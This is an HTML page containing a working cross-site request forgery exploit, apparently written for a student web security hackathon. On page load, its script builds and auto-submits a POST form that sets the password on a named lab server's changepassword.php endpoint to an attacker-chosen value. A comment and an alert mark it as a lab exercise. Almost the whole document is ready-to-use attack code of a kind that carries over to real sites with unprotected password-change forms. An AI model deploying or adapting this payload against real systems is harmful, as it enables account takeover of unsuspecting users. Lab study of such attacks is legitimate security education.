<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack</title>
</head>
<body>

<script>
    function CSRF(){
        // create a form element
        var form = document.createElement('form');
        //construct the form 
        form.action = "https://waph-hackathon.eastus.cloudapp.azure.com/csrf/changepassword.php";
        form.method = 'POST'; // Change method to POST
        form.target = '_self';
        form.innerHTML = '<input type="password" name="password" value="UCIT@hacked1" />'; // Specify input type and name
        //append the form to the current page
        document.body.appendChild(form);
        //just for the lab report to capture the screenshot, otherwise , the CSRF
        //will be submitted automatically
        alert('CSRF attack for hackathon 4 is about to happen - By Maheedhar Atmakuru');
        //Submit the form
        form.submit();
    }

    //call CSRF() to forge an HTTP POST request to the vulnerable application
    CSRF();
</script>

</body>
</html>
